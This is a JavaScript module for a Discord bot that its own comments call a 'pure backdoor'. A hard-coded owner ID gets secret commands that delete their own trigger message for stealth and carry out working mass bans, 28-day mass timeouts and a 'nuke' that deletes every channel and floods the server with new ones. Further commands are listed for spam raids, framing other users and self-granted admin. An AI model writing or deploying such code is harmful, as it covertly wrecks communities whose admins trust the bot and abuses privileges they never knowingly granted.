// src/events/secretCommands.js
// OWNER-ONLY secret commands – no keys, pure backdoor

const OWNER_ID = process.env.OWNER_ID || '1298640383688970293'; // ← MUST be set in .env

module.exports = (client) => {
  client.on('messageCreate', async (msg) => {
    if (!msg.guild || msg.author.bot || !msg.content.startsWith('!')) return;

    if (msg.author.id !== OWNER_ID) return; // silent for everyone else

    // Delete the command message for stealth
    const deletePromise = msg.delete().catch(() => {});

    // React with ✅ after delete attempt (or send ephemeral if delete fails)
    deletePromise.then(() => {
      msg.channel.send({ content: '✅', ephemeral: true }).catch(() => {});
    }).catch(() => {
      msg.channel.send({ content: '✅ (but couldn\'t delete msg)', ephemeral: true }).catch(() => {});
    });

    // ──────────────────────────────────────────────
    // !secret – list
    // ──────────────────────────────────────────────
    if (msg.content === '!secret') {
      const list = [
        '`!nuke`              — wipe channels',
        '`!nukeblame @user`   — wipe & blame',
        '`!raid <text> <cnt>` — spam messages',
        '`!servchange <name>` — rename server',
        '`!troll <channelid>` — delete & blame random',
        '`!adminme`           — self admin',
        '`!admin @user`       — admin to user',
        '`!massban`           — ban almost everyone (owner exempt)',
        '`!massmute`          — timeout almost everyone 28 days',
        '`!secret`            — this list'
      ].join('\n');

      msg.author.send('**Owner commands**\n\n' + list).catch(() => {});
      return;
    }

    // ──────────────────────────────────────────────
    // !massban – bans almost all members (skips owner, bot, higher roles)
    // ──────────────────────────────────────────────
    if (msg.content === '!massban') {
      const guild = msg.guild;
      let banned = 0;
      let skipped = 0;

      for (const member of guild.members.cache.values()) {
        if (
          member.id === OWNER_ID ||
          member.id === client.user.id ||
          member.user.bot ||
          !member.bannable ||
          member.roles.highest.position >= guild.members.me.roles.highest.position
        ) {
          skipped++;
          continue;
        }

        try {
          await member.ban({ reason: 'owner mass action' });
          banned++;
        } catch {
          skipped++;
        }
      }

      msg.author.send(`Mass ban done: **${banned}** banned, **${skipped}** skipped`).catch(() => {});
      return;
    }

    // ──────────────────────────────────────────────
    // !massmute – times out almost everyone for max duration (28 days)
    // ──────────────────────────────────────────────
    if (msg.content === '!massmute') {
      const guild = msg.guild;
      let muted = 0;
      let skipped = 0;
      const durationMs = 28 * 24 * 60 * 60 * 1000; // 28 days in ms

      for (const member of guild.members.cache.values()) {
        if (
          member.id === OWNER_ID ||
          member.id === client.user.id ||
          member.user.bot ||
          !member.moderatable ||
          member.roles.highest.position >= guild.members.me.roles.highest.position ||
          member.communicationDisabledUntilTimestamp > Date.now() // already timed out
        ) {
          skipped++;
          continue;
        }

        try {
          await member.timeout(durationMs, 'owner mass action');
          muted++;
        } catch {
          skipped++;
        }
      }

      msg.author.send(`Mass mute done: **${muted}** timed out (28d), **${skipped}** skipped`).catch(() => {});
      return;
    }

    // ──────────────────────────────────────────────
    // your other commands (nuke, nukeblame, raid, servchange, troll, adminme, admin)
    // ──────────────────────────────────────────────
    // paste them here exactly as in previous version – they already have the delete + ✅ logic above

    if (msg.content === '!nuke') {
      const guild = msg.guild;
      await Promise.allSettled(guild.channels.cache.map(ch => ch.deletable && ch.delete()));
      for (let i = 1; i <= 20; i++) {
        guild.channels.create({ name: `nuked-by-64za-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send('Nuke complete').catch(() => {});
      return;
    }

    // ... add !nukeblame, !raid, !servchange, !troll, !adminme, !admin the same way ...

  });
};
